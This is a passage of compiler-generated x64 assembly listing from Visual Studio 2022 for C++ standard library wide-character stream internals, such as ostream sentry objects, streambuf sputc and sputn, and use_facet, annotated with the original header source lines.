??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z ENDP ; std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv290 = 36
tv292 = 38
$T1 = 40
$T2 = 42
tv295 = 44
tv297 = 46
$T3 = 48
$T4 = 50
_Pad$ = 56
tv136 = 64
tv291 = 72
tv293 = 80
tv294 = 88
tv296 = 96
$T5 = 104
_Ok$ = 112
_Ostr$ = 144
_Data$ = 152
_Size$ = 160
?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA PROC ; `std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA ENDP ; `std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv290 = 36
tv292 = 38
$T1 = 40
$T2 = 42
tv295 = 44
tv297 = 46
$T3 = 48
$T4 = 50
_Pad$ = 56
tv136 = 64
tv291 = 72
tv293 = 80
tv294 = 88
tv296 = 96
$T5 = 104
_Ok$ = 112
_Ostr$ = 144
_Data$ = 152
_Size$ = 160
?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA PROC ; `std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>'::`1'::catch$1

; 529  :         _CATCH_IO_(_Ostr_t, _Ostr)

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z$0:
	mov	rax, QWORD PTR _Ostr$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
	npad	1
	lea	rax, $LN24@catch$1
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA ENDP ; `std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>'::`1'::catch$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ
_TEXT	SEGMENT
tv69 = 0
this$ = 32
?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ PROC ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pnavail, COMDAT

; 257  :     streamsize __CLR_OR_THIS_CALL _Pnavail() const { // count number of available positions in write buffer

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 258  :         return *_IPnext ? *_IPcount : 0;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	cmp	QWORD PTR [rax], 0
	je	SHORT $LN3@Pnavail
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+88]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR tv69[rsp], eax
	jmp	SHORT $LN4@Pnavail
$LN3@Pnavail:
	mov	DWORD PTR tv69[rsp], 0
$LN4@Pnavail:
	movsxd	rax, DWORD PTR tv69[rsp]

; 259  :     }

	add	rsp, 24
	ret	0
?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ ENDP ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pnavail
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ
_TEXT	SEGMENT
tv76 = 0
this$ = 32
?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ PROC ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pninc, COMDAT

; 252  :     _Elem* __CLR_OR_THIS_CALL _Pninc() { // increment current position in write buffer

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 253  :         --*_IPcount;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+88]
	mov	eax, DWORD PTR [rax]
	dec	eax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+88]
	mov	DWORD PTR [rcx], eax

; 254  :         return (*_IPnext)++;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR tv76[rsp], rax
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+64]
	mov	rax, QWORD PTR [rax]
	add	rax, 2
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx+64]
	mov	QWORD PTR [rcx], rax
	mov	rax, QWORD PTR tv76[rsp]

; 255  :     }

	add	rsp, 24
	ret	0
?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ ENDP ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pninc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
_Count$ = 64
?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z PROC ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputn, COMDAT

; 171  :         streamsize _Count) { // put _Count characters from array beginning at _Ptr

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 172  :         return xsputn(_Ptr, _Count);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+72]

; 173  :     }

	add	rsp, 40					; 00000028H
	ret	0
?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z ENDP ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputn
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z
_TEXT	SEGMENT
tv78 = 32
$T1 = 40
tv79 = 48
this$ = 80
_Ch$ = 88
?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z PROC ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc, COMDAT

; 166  :     int_type __CLR_OR_THIS_CALL sputc(_Elem _Ch) { // put a character

$LN5:
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 167  :         return 0 < _Pnavail() ? _Traits::to_int_type(*_Pninc() = _Ch) : overflow(_Traits::to_int_type(_Ch));

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pnavail
	test	rax, rax
	jle	SHORT $LN3@sputc
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pninc
	mov	QWORD PTR $T1[rsp], rax
	mov	rax, QWORD PTR $T1[rsp]
	movzx	ecx, WORD PTR _Ch$[rsp]
	mov	WORD PTR [rax], cx
	mov	rcx, QWORD PTR $T1[rsp]
	call	?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z ; std::_WChar_traits<wchar_t>::to_int_type
	mov	WORD PTR tv78[rsp], ax
	jmp	SHORT $LN4@sputc
$LN3@sputc:
	lea	rcx, QWORD PTR _Ch$[rsp]
	call	?to_int_type@?$_WChar_traits@_W@std@@SAGAEB_W@Z ; std::_WChar_traits<wchar_t>::to_int_type
	mov	rcx, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rcx]
	mov	QWORD PTR tv79[rsp], rcx
	movzx	edx, ax
	mov	rcx, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR tv79[rsp]
	call	QWORD PTR [rax+24]
	mov	WORD PTR tv78[rsp], ax
$LN4@sputc:
	movzx	eax, WORD PTR tv78[rsp]

; 168  :     }

	add	rsp, 72					; 00000048H
	ret	0
?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ENDP ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\streambuf
;	COMDAT ?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ
_TEXT	SEGMENT
this$ = 48
?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ PROC ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::pubsync, COMDAT

; 121  :     int __CLR_OR_THIS_CALL pubsync() { // synchronize with external agent

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 122  :         return sync();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+104]

; 123  :     }

	add	rsp, 40					; 00000028H
	ret	0
?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ ENDP ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::pubsync
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z
_TEXT	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z PROC ; std::use_facet<std::ctype<wchar_t> >, COMDAT

; 422  : const _Facet& __CRTDECL use_facet(const locale& _Loc) { // get facet reference from locale

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 423  :     _BEGIN_LOCK(_LOCK_LOCALE) // the thread lock, make get atomic

	xor	edx, edx
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit
	npad	1

; 424  :     const locale::facet* _Psave = _Facetptr<_Facet>::_Psave; // static pointer to lazy facet

	mov	rax, QWORD PTR ?_Psave@?$_Facetptr@V?$ctype@_W@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::ctype<wchar_t> >::_Psave
	mov	QWORD PTR _Psave$2[rsp], rax

; 425  : 
; 426  :     const size_t _Id         = _Facet::id;

	lea	rcx, OFFSET FLAT:?id@?$ctype@_W@std@@2V0locale@2@A ; std::ctype<wchar_t>::id
	call	??Bid@locale@std@@QEAA_KXZ		; std::locale::id::operator unsigned __int64
	mov	QWORD PTR _Id$6[rsp], rax

; 427  :     const locale::facet* _Pf = _Loc._Getfacet(_Id);

	mov	rdx, QWORD PTR _Id$6[rsp]
	mov	rcx, QWORD PTR _Loc$[rsp]
	call	?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z ; std::locale::_Getfacet
	mov	QWORD PTR _Pf$4[rsp], rax

; 428  : 
; 429  :     if (!_Pf) {

	cmp	QWORD PTR _Pf$4[rsp], 0
	jne	$LN2@use_facet

; 430  :         if (_Psave) {

	cmp	QWORD PTR _Psave$2[rsp], 0
	je	SHORT $LN3@use_facet

; 431  :             _Pf = _Psave; // lazy facet already allocated

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax
	jmp	SHORT $LN2@use_facet
$LN3@use_facet:

; 432  :         } else if (_Facet::_Getcat(&_Psave, &_Loc) == static_cast<size_t>(-1)) {

	mov	rdx, QWORD PTR _Loc$[rsp]
	lea	rcx, QWORD PTR _Psave$2[rsp]
	call	?_Getcat@?$ctype@_W@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::ctype<wchar_t>::_Getcat
	cmp	rax, -1
	jne	SHORT $LN5@use_facet

; 433  : #if _HAS_EXCEPTIONS
; 434  :             _Throw_bad_cast(); // lazy disallowed

	call	?_Throw_bad_cast@std@@YAXXZ		; std::_Throw_bad_cast
	npad	1

; 435  : #else // _HAS_EXCEPTIONS
; 436  :             _CSTD abort(); // lazy disallowed
; 437  : #endif // _HAS_EXCEPTIONS
; 438  :         } else { // queue up lazy facet for destruction

	jmp	SHORT $LN2@use_facet
$LN5@use_facet:

; 439  :             auto _Pfmod = const_cast<locale::facet*>(_Psave);

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pfmod$3[rsp], rax

; 440  :             unique_ptr<_Facet_base> _Psave_guard(static_cast<_Facet_base*>(_Pfmod));

	mov	rdx, QWORD PTR _Pfmod$3[rsp]
	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
	npad	1

; 441  : 
; 442  : #if defined(_M_CEE)
; 443  :             _Facet_Register_m(_Pfmod);
; 444  : #else // defined(_M_CEE)
; 445  :             _Facet_Register(_Pfmod);

	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z ; std::_Facet_Register

; 446  : #endif // defined(_M_CEE)
; 447  : 
; 448  :             _Pfmod->_Incref();

	mov	rax, QWORD PTR _Pfmod$3[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	QWORD PTR [rax+8]

; 449  :             _Facetptr<_Facet>::_Psave = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR ?_Psave@?$_Facetptr@V?$ctype@_W@std@@@std@@2PEBVfacet@locale@2@EB, rax ; std::_Facetptr<std::ctype<wchar_t> >::_Psave

; 450  :             _Pf                       = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax

; 451  : 
; 452  :             (void) _Psave_guard.release();

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
	npad	1

; 453  :         }

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
$LN2@use_facet:

; 454  :     }
; 455  : 
; 456  :     return static_cast<const _Facet&>(*_Pf); // should be dynamic_cast

	mov	rax, QWORD PTR _Pf$4[rsp]
	mov	QWORD PTR $T7[rsp], rax
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	mov	rax, QWORD PTR $T7[rsp]

; 457  :     _END_LOCK()
; 458  : } // end of use_facet body

	add	rsp, 104				; 00000068H
	ret	0
$LN10@use_facet:
??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z ENDP ; std::use_facet<std::ctype<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::ctype<wchar_t> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Lock$1[rbp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::ctype<wchar_t> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::ctype<wchar_t> >'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Psave_guard$5[rbp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::ctype<wchar_t> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool, COMDAT

; 123  :         explicit __CLR_OR_THIS_CALL operator bool() const {

	mov	QWORD PTR [rsp+8], rcx

; 124  :             return _Ok;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+8]

; 125  :         }

	ret	0
??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
tv72 = 32
_Zero_uncaught_exceptions$ = 33
this$ = 64
??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry, COMDAT

; 108  :         __CLR_OR_THIS_CALL ~sentry() noexcept {

$LN6:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 109  : #if !_HAS_EXCEPTIONS
; 110  :             const bool _Zero_uncaught_exceptions = true;
; 111  : #elif _HAS_DEPRECATED_UNCAUGHT_EXCEPTION
; 112  :             const bool _Zero_uncaught_exceptions = !_STD uncaught_exception(); // TRANSITION, ArchivedOS-12000909

	call	?uncaught_exception@std@@YA_NXZ		; std::uncaught_exception
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN4@sentry
	mov	BYTE PTR tv72[rsp], 1
	jmp	SHORT $LN5@sentry
$LN4@sentry:
	mov	BYTE PTR tv72[rsp], 0
$LN5@sentry:
	movzx	eax, BYTE PTR tv72[rsp]
	mov	BYTE PTR _Zero_uncaught_exceptions$[rsp], al

; 113  : #else // ^^^ _HAS_DEPRECATED_UNCAUGHT_EXCEPTION / !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION vvv
; 114  :             const bool _Zero_uncaught_exceptions = _STD uncaught_exceptions() == 0;
; 115  : #endif // !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION
; 116  : 
; 117  :             if (_Zero_uncaught_exceptions) {

	movzx	eax, BYTE PTR _Zero_uncaught_exceptions$[rsp]
	test	eax, eax
	je	SHORT $LN2@sentry

; 118  :                 this->_Myostr._Osfx();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx
$LN2@sentry:

; 119  :             }
; 120  :         }

	mov	rcx, QWORD PTR this$[rsp]
	call	??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::~_Sentry_base
	npad	1
	add	rsp, 56					; 00000038H
	ret	0
??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
_TEXT	SEGMENT
_Tied$ = 32
this$ = 64
_Ostr$ = 72
??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry, COMDAT

; 91   :         explicit __CLR_OR_THIS_CALL sentry(basic_ostream& _Ostr) : _Sentry_base(_Ostr) {

$LN7:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rdx, QWORD PTR _Ostr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::_Sentry_base
	npad	1

; 92   :             if (!_Ostr.good()) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@sentry

; 93   :                 _Ok = false;

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax+8], 0

; 94   :                 return;

	jmp	SHORT $LN1@sentry
$LN2@sentry:

; 95   :             }
; 96   : 
; 97   :             const auto _Tied = _Ostr.tie();

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::tie
	mov	QWORD PTR _Tied$[rsp], rax

; 98   :             if (!_Tied || _Tied == &_Ostr) {

	cmp	QWORD PTR _Tied$[rsp], 0
	je	SHORT $LN4@sentry
	mov	rax, QWORD PTR _Ostr$[rsp]
	cmp	QWORD PTR _Tied$[rsp], rax
	jne	SHORT $LN3@sentry
$LN4@sentry:

; 99   :                 _Ok = true;

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax+8], 1

; 100  :                 return;

	jmp	SHORT $LN1@sentry
$LN3@sentry:

; 101  :             }
; 102  : 
; 103  :             _Tied->flush();

	mov	rcx, QWORD PTR _Tied$[rsp]
	call	?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush

; 104  :             _Ok = _Ostr.good(); // store test only after flushing tie

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	mov	rcx, QWORD PTR this$[rsp]
	mov	BYTE PTR [rcx+8], al
$LN1@sentry:

; 105  :         }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Tied$ = 32
this$ = 64
_Ostr$ = 72
?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA PROC ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::~_Sentry_base
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA ENDP ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
_Rdbuf$ = 32
tv72 = 40
this$ = 64
??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::~_Sentry_base, COMDAT

; 77   :         __CLR_OR_THIS_CALL ~_Sentry_base() noexcept { // destroy after unlocking

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 78   :             const auto _Rdbuf = _Myostr.rdbuf();

	mov	rax, QWORD PTR this$[rsp]
